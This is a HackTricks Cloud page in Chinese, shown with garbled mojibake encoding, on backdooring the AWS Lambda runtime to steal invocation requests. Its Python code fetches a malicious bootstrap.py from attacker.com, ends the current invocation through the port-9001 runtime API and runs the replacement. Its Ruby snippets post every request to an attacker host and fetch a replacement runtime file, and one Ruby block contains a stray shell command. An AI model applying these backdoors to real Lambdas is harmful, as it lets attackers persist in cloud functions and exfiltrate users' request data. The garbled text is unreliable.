# AWS - çªƒå–Lambdaè¯·æ±‚

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ç®€ä»‹ <a href="#python-runtime" id="python-runtime"></a>

è¿™ç§æ”»å‡»å‡è®¾æ‚¨å¯¹æ­£åœ¨è¿è¡Œçš„Lambdaæœ‰æŸç§**è®¿é—®æƒé™**ã€‚\
å¦å¤–ï¼Œé‡è¦çš„ä¸€ç‚¹æ˜¯**Lambdaè°ƒç”¨å¹¶ä¸æ˜¯å®Œå…¨éš”ç¦»çš„ï¼Œä½†å®ƒä»¬æ˜¯è¢«éš”ç¦»çš„**ã€‚å®ƒä»¬å¯ä»¥åœ¨åŒä¸€ä¸ªæ‰§è¡Œç¯å¢ƒä¸­è¿è¡Œï¼Œå°½ç®¡ä¸æ˜¯åŒæ—¶ã€‚äº†è§£è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬å¼€å§‹è§£å‰–é‚£ä¸ªç¯å¢ƒã€‚

### éš”ç¦»

Lambdaéš”ç¦»ä½¿ç”¨ä»¥ä¸‹cgroupsï¼š

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

ç”±äºå‰ç¼€'sandbox'æ²¡æœ‰åŒ¹é…ä»»ä½•å¸¸è§çš„å®¹å™¨å¼•æ“ï¼ˆdocker, podman, LXD, rktï¼‰ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªä¸“æœ‰çš„å®¹å™¨å¼•æ“ï¼Œå¯èƒ½åœ¨å†…éƒ¨ä½¿ç”¨åƒ[runC](https://github.com/opencontainers/runc)è¿™æ ·çš„å¼€æºå®¹å™¨è¿è¡Œæ—¶ã€‚

### Lambdasçš„å·¥ä½œåŸç†  <a href="#python-runtime" id="python-runtime"></a>

è¿™ä¼¼ä¹æ˜¯python Lambdaæ¶æ„ï¼š

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. ä¸€ä¸ªä½äºå®¹å™¨å¤–éƒ¨çš„è¿›ç¨‹ï¼Œè¢«ç§°ä¸ºinitäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„â€œ**slicer**â€ï¼Œé€šè¿‡å…±äº«å†…å­˜å‘**init**è¿›ç¨‹å‘é€è°ƒç”¨äº‹ä»¶ã€‚
2. initè¿›ç¨‹åœ¨ç«¯å£9001ï¼ˆç¡¬ç¼–ç ï¼‰ä¸Šè®¾ç½®äº†ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œæš´éœ²äº†å‡ ä¸ªç«¯ç‚¹ï¼š
   1. /2018-06-01/runtime/invocation/**next** â€“ è·å–ä¸‹ä¸€ä¸ªè°ƒç”¨äº‹ä»¶
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** â€“ è¿”å›è°ƒç”¨çš„å¤„ç†å™¨å“åº”
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** â€“ è¿”å›æ‰§è¡Œé”™è¯¯
3. åœ¨`bootstrap.py`ä¸­ï¼Œä»¥ä¸‹å¾ªç¯**æŸ¥è¯¢initè¿›ç¨‹ä»¥è·å–æ–°äº‹ä»¶**ï¼Œç„¶å**è°ƒç”¨ç”¨æˆ·çš„å‡½æ•°**æ¥å¤„ç†å®ƒï¼ˆè¿™é‡Œï¼Œæ‚¨ä¸Šä¼ çš„è¯·æ±‚å¤„ç†å™¨è¿è¡Œï¼‰ã€‚\


<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. ç„¶åé€šè¿‡ä»¥ä¸‹ç«¯ç‚¹ä¹‹ä¸€å°†**å¤„ç†å™¨å“åº”å‘é€å›initè¿›ç¨‹**ï¼š
   1. `/{invoke-id}/response` â€“ å¦‚æœç”¨æˆ·å¤„ç†å™¨æˆåŠŸæ‰§è¡Œ
   2. `/{invoke-id}/error` â€“ å¦‚æœåœ¨å¤„ç†è°ƒç”¨æœŸé—´å¼•å‘äº†å¼‚å¸¸

## æŠ€æœ¯æ€»ç»“ <a href="#python-runtime" id="python-runtime"></a>

æœ‰å¯èƒ½ç”¨æ¶æ„ä»£ç **æ›¿æ¢bootstrapè„šæœ¬**ï¼Œä»¥ä¾¿èƒ½å¤Ÿ**æˆªè·**å‘é€åˆ°Lambdaå‡½æ•°çš„æ•°æ®ã€‚\
æ³¨æ„**å…¶ä»–è¯­è¨€ä¸­çš„å…¶ä»–å¼•æ“**ä¹Ÿæœ‰ç”¨é‚£ç§è¯­è¨€ç¼–å†™çš„å¦ä¸€ä¸ª**bootstrapè„šæœ¬**ï¼Œæ‰€ä»¥è¿™ä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨å…¶ä»–è¯­è¨€çš„**å…¶ä»–lambdas**ä¸­å®Œæˆï¼Œä¸ä»…ä»…æ˜¯åœ¨pythonä¸­ã€‚

## Python <a href="#python-runtime" id="python-runtime"></a>

ä»lambdaä¸‹è½½**`/var/runtime/bootstrap.py`**ï¼ˆæˆ–è€…åªæ˜¯å¯åŠ¨**æ‚¨è‡ªå·±çš„lambda**å¹¶è·å–å®ƒï¼‰ï¼Œå¹¶æ·»åŠ åé—¨ï¼Œå®ƒå°†æ³„éœ²å‘é€åˆ°Lambdaçš„æ‰€æœ‰æ•°æ®ã€‚æ‚¨åªéœ€è¦æ·»åŠ å‡ è¡Œä»£ç ï¼Œä¾‹å¦‚ï¼š

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### æ›¿æ¢è¿è¡Œæ—¶

ç°åœ¨ï¼Œåˆ›å»ºäº†æ–°çš„**`boostrap.py`**ï¼Œå¯ä»¥**ä¸‹è½½**å®ƒï¼Œ**ç»“æŸå½“å‰lambda** **è°ƒç”¨**å¹¶è¿è¡Œå®ƒä»¥**æ›¿æ¢**åˆæ³•çš„ä¸€ä¸ªï¼š
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py)ï¼Œå®ƒå°†åƒä¹‹å‰ä¸€æ ·ç»“æŸè°ƒç”¨ï¼Œè¿è¡Œæ–°çš„ bootstrap å¹¶æ³„éœ²ä¿¡æ¯ã€‚

{% hint style="warning" %}
å¦‚æœä¸€ä¸ª lambda å‡½æ•°åœ¨ 5-15 åˆ†é’Ÿå†…æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå®ƒå°†è¢«å…³é—­ï¼Œä¸‹æ¬¡è°ƒç”¨æ—¶æ‰€æœ‰æ›´æ”¹éƒ½å°†ä¸¢å¤±ã€‚
{% endhint %}

## Ruby è¿è¡Œæ—¶ <a href="#ruby-runtime" id="ruby-runtime"></a>

åœ¨ ruby ä¸­ï¼Œæ‚¨æƒ³è¦åé—¨çš„æ–‡ä»¶æ˜¯ **`/var/runtime/lib/runtime.rb`** æ–‡ä»¶ï¼ˆä»ç³»ç»Ÿä¸­è·å–æˆ–è¿è¡Œæ‚¨è‡ªå·±çš„ lambdaï¼‰ã€‚

æ·»åŠ åé—¨å°±åƒåœ¨ python ç‰ˆæœ¬ä¸­ä¸€æ ·ç®€å•ï¼š
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
æ¥ç€ï¼Œæ‚¨åªéœ€æŒ‰ç…§æ‚¨åœ¨pythonç‰ˆæœ¬ä¸­æ‰€åšçš„æ“ä½œè¿›è¡Œä¸€äº›æ›´æ”¹ï¼š

* **åœ¨ä¸€ä¸ªç›®å½•ä¸­ä¸‹è½½åé—¨**
* **ç¬¦å·é“¾æ¥** `/var/runtime/lib/*` åˆ°åé—¨æ‰€åœ¨çš„ç›®å½•
* ç»“æŸå½“å‰çš„lambdaè°ƒç”¨
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## å‚è€ƒèµ„æ–™

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
